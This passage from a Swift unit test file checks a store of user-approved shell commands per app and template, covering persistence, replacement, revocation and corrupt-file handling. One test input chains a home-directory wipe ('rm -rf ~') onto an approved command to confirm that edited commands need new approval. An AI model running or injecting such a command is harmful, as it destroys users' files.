        let file = dir.appendingPathComponent("approvals.json")
        let a = TemplateCommandApprovals(file: file)
        XCTAssertFalse(a.isApproved(app: "x", template: "t", command: "echo hi"))
        a.approve(app: "x", template: "t", commands: ["echo hi", "  ls  "])
        XCTAssertTrue(a.isApproved(app: "x", template: "t", command: "echo hi"))
        XCTAssertTrue(a.isApproved(app: "x", template: "t", command: "ls"), "whitespace around a command does not matter")
        XCTAssertFalse(a.isApproved(app: "x", template: "t", command: "echo hi; rm -rf ~"), "an edited command asks again")
        XCTAssertFalse(a.isApproved(app: "x", template: "other", command: "echo hi"))
        XCTAssertFalse(a.isApproved(app: "y", template: "t", command: "echo hi"))

        // It survives a relaunch.
        let again = TemplateCommandApprovals(file: file)
        XCTAssertTrue(again.isApproved(app: "x", template: "t", command: "echo hi"))
        XCTAssertEqual(again.all().map(\.id), ["x/t"])
        XCTAssertEqual(again.all().first?.commands, ["echo hi", "ls"])

        // A new approval replaces the old one: the command that is gone is no longer covered.
        again.approve(app: "x", template: "t", commands: ["ls"])
        XCTAssertFalse(again.isApproved(app: "x", template: "t", command: "echo hi"))

        again.revoke(app: "x", template: "t")
        XCTAssertFalse(again.isApproved(app: "x", template: "t", command: "ls"))
        XCTAssertTrue(TemplateCommandApprovals(file: file).all().isEmpty)
    }

    func testCorruptApprovalFileMeansNoApprovals() {
        let file = dir.appendingPathComponent("approvals.json")
        try? "not json".write(to: file, atomically: true, encoding: .utf8)
        XCTAssertTrue(TemplateCommandApprovals(file: file).all().isEmpty)
    }
}
